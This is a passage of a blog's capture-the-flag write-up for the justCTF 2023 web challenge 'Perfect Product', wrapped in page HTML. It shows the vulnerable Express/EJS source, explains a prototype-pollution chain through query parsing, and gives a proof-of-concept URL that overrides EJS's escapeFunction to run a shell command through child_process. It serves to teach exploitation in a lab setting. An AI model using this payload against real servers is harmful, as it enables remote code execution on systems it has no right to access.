class="keyword">in</span> verify(forbidden, sigs):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="Perfect-Product"><a href="#Perfect-Product" class="headerlink" title="Perfect Product"></a>Perfect Product</h2><blockquote>
<p>Description: Check out my newest product gallery.<br>Category: WEB<br>Points: 340<br>Solves: 13</p>
</blockquote>
<p>The source code is quite simple：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> res.render(<span class="string">&#x27;index&#x27;</span>, &#123;products&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> params = req.body;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> params.name !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">      <span class="keyword">typeof</span> params.description !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">      <span class="keyword">typeof</span> params.price !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">      <span class="keyword">typeof</span> params.tax !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">      <span class="keyword">typeof</span> params.country !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">      <span class="keyword">typeof</span> params.image !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    res.send(<span class="string">&#x27;Bad request.&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  products.push(&#123;<span class="attr">name</span>: params.name, <span class="attr">description</span>: params.description, <span class="attr">price</span>: params.price, <span class="attr">tax</span>: params.tax, <span class="attr">country</span>: params.country, <span class="attr">image</span>: params.image&#125;);</span><br><span class="line">  <span class="keyword">return</span> res.render(<span class="string">&#x27;index&#x27;</span>, &#123;products&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">&#x27;/product&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> params = req.query || &#123;&#125;;</span><br><span class="line">  <span class="built_in">Object</span>.assign(params, req.body || &#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> name = params.name </span><br><span class="line">  <span class="keyword">let</span> strings = params.v;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!(strings <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &amp;&amp; !<span class="built_in">Array</span>.isArray(strings))&#123;</span><br><span class="line">    strings = [<span class="string">&#x27;NaN&#x27;</span>, <span class="string">&#x27;NaN&#x27;</span>, <span class="string">&#x27;NaN&#x27;</span>, <span class="string">&#x27;NaN&#x27;</span>, <span class="string">&#x27;NaN&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// make _0 to point to all strings, copy to prevent reference.</span></span><br><span class="line">  strings.unshift(<span class="built_in">Array</span>.from(strings));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data = &#123;&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> idx <span class="keyword">in</span> strings)&#123;</span><br><span class="line">    data[<span class="string">`_<span class="subst">$&#123;idx&#125;</span>`</span>] = strings[idx];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> name !== <span class="string">&#x27;string&#x27;</span>)&#123;</span><br><span class="line">    name = <span class="string">`Product: NaN`</span>; </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    name = <span class="string">`Product: <span class="subst">$&#123;name&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  data[<span class="string">&#x27;productname&#x27;</span>] = name;</span><br><span class="line"></span><br><span class="line">  data[<span class="string">&#x27;print&#x27;</span>] = !!params.print;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  res.render(<span class="string">&#x27;product&#x27;</span>, data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> testStr = <span class="string">`test4444`</span>;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> fetch(<span class="string">`http://localhost:<span class="subst">$&#123;port&#125;</span>/product?name=<span class="subst">$&#123;testStr&#125;</span>`</span>).then(<span class="function"><span class="params">e</span>=&gt;</span>e.text());</span><br><span class="line">  <span class="keyword">if</span>(res.includes(testStr))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`App listening on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Something went wrong while spawning the challenge&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>It uses the <a target="_blank" rel="noopener" href="https://ejs.co/">ejs</a> rendering engine:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.enable(<span class="string">&#x27;view cache&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>And we can find some relevant posts:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo">AIS3-EOF-CTF-2019-Quals/echo</a></li>
<li><a target="_blank" rel="noopener" href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce">EJS - Server Side Prototype Pollution gadgets to RCE</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/ljharb/qs/blob/main/test/parse.js">qs/parse.js</a></li>
</ul>
<p>So now we know:</p>
<ul>
<li>the prototype of <code>data</code> is controllable</li>
<li>set cache to a <code>null</code> string to disable view cache so that we can modify view options</li>
<li>we can modify the <code>escapeFunction</code> when <code>client</code> is set to a valid value</li>
</ul>
<p>The POC is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/product?v[__proto__][]=exp&amp;v[__proto__][]=exp&amp;v[__proto__][]=exp&amp;v[__proto__][]=exp&amp;v[_proto__][cache]=&amp;v[_proto__][settings][view options][client]=1&amp;v[_proto__][settings][view options][escapeFunction]=process.mainModule.constructor._load(&quot;child_process&quot;).exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">in1t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://in1t.top/2023/06/07/justCTF-2023/">https://in1t.top/2023/06/07/justCTF-2023/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://in1t.top" target="_blank">in1t's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/justctf2023.png" data-sites="wechat,qq,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/04/02/7th-XCTF-Final-Super-Flagio/"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/cover/xctf2022.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">7th XCTF Final - Super Flagio</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/02/03/buuoj-逆向刷题之旅（三）/" title="buuoj 逆向刷题之旅（三）"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/cover/buuojre3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-03</div><div class="title">buuoj 逆向刷题之旅（三）</div></div></a></div><div><a href="/2022/06/14/justCTF-2022-AMXX/" title="justCTF 2022 - AMXX"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/cover/justctf2022.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-14</div><div class="title">justCTF 2022 - AMXX</div></div></a></div><div><a href="/2020/11/28/buuoj-逆向刷题之旅（二）/" title="buuoj 逆向刷题之旅（二）"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/cover/buuojre2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-28</div><div class="title">buuoj 逆向刷题之旅（二）</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tic-Tac-PWN"><span class="toc-number">1.</span> <span class="toc-text">Tic Tac PWN!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Multi-Auth"><span class="toc-number">2.</span> <span class="toc-text">Multi Auth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perfect-Product"><span class="toc-number">3.</span> <span class="toc-text">Perfect Product</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/cover/justctf2023.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By in1t</div><div class="footer_custom_text"><p><a style="margin-inline:5px" target="_blank" href="https://hexo.io/"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a><a style="margin-inline:5px" target="_blank" href="https://butterfly.js.org/"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-orange?style=flat&logo=bitdefender" title="主题采用butterfly"></a><a style="margin-inline:5px" target="_blank" href="https://github.com/"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.shields.io/badge/Source-Github-brightgreen?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a><a style="margin-inline:5px" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script async="async">var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())
setTimeout(function(){preloader.endLoading();}, 5000);</script><div class="js-pjax"></div><script defer src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="/js/modify.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="💐,🌸,💮,🏵,🌹,🥀,🌺,🌻,🌼,🌷,🌱,🌲,🌳,🌴,🌵,🌾,🌿,☘,🍀,🍁,🍂,🍃,🍇,🍈,🍉,🍊,🍋,🍌,🍍,🍎,🍏,🍐,🍑,🍒,🍓,🥝,🍅,🥥,🥑,🍆,🥔,🥕,🌽,🌶,🥒,🥬,🥦,🧄,🧅,🍄,🥜,🌰,🍞,🥐,🥖,🥨,🥯,🥞,🧇,🧀,🍖,🍗,🥩,🥓,🍔,🍟,🍕,🌭,🥪,🌮,🌯,🥙,🧆,🥚,🍳,🥘,🍲,🥣,🥗,🍿,🧈,🧂,🥫,🍱,🍘,🍙,🍚,🍛,🍜,🍠,🍢,🍣,🍤,🍥,🥮,🍡,🥟,🥠,🥡,🦪,🍨,🍩,🍪,🎂,🍰,🧁,🥧,🍫,🍬,🍭,🍮,🍯,🍼,🥛,☕,🍵,🍶,🍾,🍷,🍹,🍻,🥂,🥃,🥤,🧃,🧉,🧊,🥢,🍽,🥄" data-fontsize="20px" data-random="false" async="async"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":20,"vOffset":-65},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body></html>